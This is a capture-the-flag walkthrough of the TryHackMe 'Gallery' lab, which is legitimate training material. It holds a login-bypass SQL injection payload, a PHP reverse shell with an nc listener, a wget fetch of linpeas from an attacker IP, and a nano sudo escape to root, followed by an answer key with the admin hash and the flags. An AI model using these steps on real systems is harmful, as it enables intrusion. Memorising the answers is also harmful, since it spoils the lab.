# Gallery - Easy

```shell
sudo vim /etc/hosts
#add gallery.thm

nmap -T4 -p- -A -Pn -v gallery.thm

#bypass using SQLi
#upload php shell to Albums page

nc -nvlp 4444
#we get reverse shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
#press Ctrl+Z
stty raw -echo; fg
#press Enter key twice

id
#www-data

#check directories /var/www, /opt, /home

cd /tmp

#in attacker machine
python3 -m http.server

#in victim machine
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#gives cleartext password

su mike
#use password

cd

#get user flag

sudo -l
#we can run script rootkit.sh as root

cat /opt/rootkit.sh
#uses rkhunter and nano

#gtfobins exploit for nano

sudo /bin/bash /opt/rootkit.sh
#give input 'read'
#in nano editor
#Ctrl+R, Ctrl+X
reset; sh 1>&0 2>&0

#we have shell as root
id

cat /root/root.txt

which mysql

mysql -u root
#MariaDB
#get admin hash

show databases;

use gallery_db;

show tables;

select * from users;
#get admin hash
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.29 (Ubuntu)
  * 8080 - http - Apache httpd 2.4.29 (Ubuntu)

* The webpage on port 80 is the default landing page for Apache on Ubuntu; we can leave it for now.

* Checking the webpage on port 8080, we have a login portal for 'Simple Image Gallery System'.

* As we do not have any clues regarding username/password, we can begin by trying injection to bypass login.

* With the help of the payload ```admin' OR 1=1#```, we are able to bypass login.

* Now, for this 'Simple Image Gallery' CMS, we have an upload functionality in Albums.

* We can first try uploading 'reverse-shell.php' file - surprisingly it works.

* We can activate reverse shell by setting up listener and clicking on the uploaded PHP shell.

* We have reverse shell as 'www-data'; we can stabilize it now.

* Checking the /home directory shows that there is a user 'mike' - we need to find some way for privesc to mike.

* Using ```linpeas``` shows the history files; this includes a cleartext password.

* We are able to switch to user 'mike' using this password and get user flag.

* Now, ```sudo -l``` shows that we can run a 'rootkit.sh' script as root.

* This script allows the user to versioncheck, update, list or read a report.

* The script uses the tools ```rkhunter``` and ```nano```.

* To use ```nano```, we have to give the input 'read' after running the script.

* Now, we have exploits on GTFObins for ```nano``` - we can use the exploit to get shell as root.

* Running the exploit gives us root shell; we can read root flag.

* To get the admin hash, we can run ```mysql``` as root - the hash is stored in the ```MariaDB``` database 'gallery_db'.

```markdown
1. How many ports are open? - 2

2. What's the name of the CMS? - Simple Image Gallery

3. What's the hash password of the admin user? - a228b12a08b6527e7978cbe5d914531c

4. What's the user flag? - THM{af05cd30bfed67849befd546ef}

5. What's the root flag? - THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```
